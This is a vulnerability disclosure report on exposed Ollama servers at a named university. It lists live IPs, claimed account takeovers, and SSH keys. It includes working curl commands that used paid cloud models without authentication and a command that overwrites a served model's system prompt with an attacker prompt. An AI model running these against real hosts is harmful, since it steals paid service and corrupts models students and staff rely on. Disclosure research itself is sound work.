# Purdue University Northwest — 3-Node Cluster, Account Takeover, Live Cloud Proxies, Claude-Distilled Model

_NuClide Research · 2026-05-01 — Updated 2026-05-03_

---

## Summary

Purdue University Northwest has 3 nodes across the 163.245.x.x subnet, all with cloud proxy subscriptions. Node 2 (163.245.207.105) exposes live Ollama Connect credentials — account takeover `5a9d376f9c56`. Node 1 (163.245.217.165) has three confirmed live cloud proxies (200 OK) and includes `sorc/qwen3.5-claude-4.6-opus:9b`, a community model distilled from Claude 4.6 Opus. Node 3 (163.245.208.96) adds gemma3:12b.

---

## Cluster Nodes

| Node | IP | Ollama | Models | Takeover |
|---|---|---|---|---|
| Node 1 | 163.245.217.165 | v0.x | qwen3-coder-next/gemma4:31b/gpt-oss:20b cloud + qwen3.5:397b + Claude-distill | No |
| Node 2 | 163.245.207.105 | v0.13.5 | deepseek-v4-pro:cloud, minimax-m2.7:cloud, llama3.2:3b | **YES — `5a9d376f9c56`** |
| Node 3 | 163.245.208.96 | v0.20.2 | deepseek-v4-pro:cloud, gemma3:12b | No |

Open WebUI at 163.245.208.42:3000 — v0.8.0, auth enabled.

---

## Account Takeover — Node 2

- **Account name:** `5a9d376f9c56`
- **SSH public key:** `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINI/elEdZn2XQ2rzMUoaZJqufbfVpPZDf+BSpbXUH9P6`

---

## Models

| Model | Size | Notes |
|---|---|---|
| **qwen3-coder-next:cloud** | 0 GB | **☁️ Cloud proxy — 200 OK CONFIRMED** |
| **gemma4:31b-cloud** | 0 GB | **☁️ Cloud proxy — 200 OK CONFIRMED** |
| **gpt-oss:20b-cloud** | 0 GB | **☁️ Cloud proxy — 200 OK, 61 tokens** |
| qwen3.5:397b-cloud | 0 GB | ☁️ Cloud proxy — timeout (large model) |
| sorc/qwen3.5-claude-4.6-opus:9b | 9 GB | Local — Claude 4.6 Opus distill |

---

## Findings

### F1 — Three Cloud Proxy Subscriptions Live (CRITICAL)

Three cloud proxy models returned **200 OK** without authentication:

```bash
# qwen3-coder-next:cloud — 4 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"qwen3-coder-next:cloud","prompt":"say: Purdue","stream":false}'
# → 200 OK, "Purdue", eval_count: 4

# gemma4:31b-cloud — 2 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gemma4:31b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, "test", eval_count: 2

# gpt-oss:20b-cloud — 61 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gpt-oss:20b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, eval_count: 61
```

All three subscriptions accessible to any internet actor without credentials. `gpt-oss:20b-cloud` (OpenAI's open-source GPT) generated 61 tokens on a single-word prompt — aggressive quota exposure.

### F2 — Cloud Proxy Model Injection (CRITICAL)

Any actor can overwrite system prompts on cloud proxy models via CVE-2025-63389:

```bash
curl -X POST http://163.245.217.165:11434/api/create \
  -d '{"model":"qwen3-coder-next:cloud","from":"qwen3-coder-next:cloud","system":"[attacker prompt]"}'
```

All students/staff accessing these models through the Open WebUI frontend (163.245.208.42:3000) would receive responses shaped by the injected prompt.

### F3 — Open WebUI Auth Bypass (HIGH)

Open WebUI at 163.245.208.42:3000 (auth=True) does not protect the Ollama backend at 163.245.217.165:11434. The Ollama and Open WebUI instances are on different IPs in the same subnet, with the raw Ollama port exposed.

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

Firewall rule: block inbound TCP 11434 at network perimeter.

---

### F4 — Account Takeover: Containerized Node (163.245.212.67) — CRITICAL

_Added 2026-05-02_

A second node exposes a live Ollama Connect claim URL, revealing a Docker containerized deployment:

```json
// 163.245.212.67 (vps3271601.trouble-free.net)
{"error":"unauthorized","signin_url":"https://ollama.com/connect?name=c0ddfaef7764&key=c3NoLWVkMjU1MT..."}
```

- **Connect name:** `c0ddfaef7764` — Docker container ID (the container's hostname)
- **SSH:** `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAP4HsQvyWIEECaFf3ZEXTMM0tKZXRTEBWwtjYqPMe/GMC`

Container ID as account name confirms Ollama runs inside Docker with `-p 11434:11434` defaulting to `0.0.0.0`. Cloud model `minimax-m2.7:cloud` accessible unauthenticated.

### F5 — User-ID Embedded Model Names: Fine-tuned Sales Models (163.245.213.131) — HIGH

_Added 2026-05-02_

`163.245.213.131` exposes models with user IDs embedded in the name, revealing a multi-tenant or automated fine-tuning platform:

| Model | Timestamp (ms) | Decoded date |
|---|---|---|
| `user-1772786129728-sales:latest` | 1772786129728 | ~2026-03-29 |
| `user-1772722866751-salesmodel_trainv3:latest` | 1772722866751 | ~2026-03-28 |
| `user-1772720121399-SalesModel_Trainv2:latest` | 1772720121399 | ~2026-03-28 |

Pattern `user-<unix_ms>-<descriptor>` suggests automated fine-tuning tooling where user models are namespaced by user ID. Sales-focused fine-tunes with iterative versioning (v2, v3) indicate proprietary training data. All accessible unauthenticated.

---

## Full Node Inventory (2026-05-02)

| IP | Status | Key Finding |
|---|---|---|
| 163.245.208.42 | dead | Open WebUI (no longer reachable) |
| 163.245.209.150 | live | cloud proxy — deepseek-v4-pro |
| 163.245.209.237 | live | plain unauth — devstral-2:123b-cloud + coding stack |
| 163.245.212.67 | live | **account takeover** — minimax-m2.7, container ID |
| 163.245.213.131 | live | **user-ID model names** — sales fine-tunes |
| 163.245.214.77 | live | cloud proxy — deepseek-v4-pro |
| 163.245.217.165 | live | cloud proxy — gpt-oss + gemma4 + qwen3-coder-next (3× 200 OK) |
| 163.245.218.86 | live | plain unauth — qwen2:0.5b |
| 163.245.221.217 | live | plain unauth — qwen3.6:35b |
| 163.245.221.89 | dead | — |

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

Firewall rule: block inbound TCP 11434 at network perimeter.

---

## Disclosure

- **Discovered:** 2026-05-01
- **Updated:** 2026-05-02 — account takeover node + user-ID model names found
- **Confirmed:** 3 cloud proxies live (200 OK), 1 account takeover live
- **Status:** Pending outreach to Purdue NW IT Security
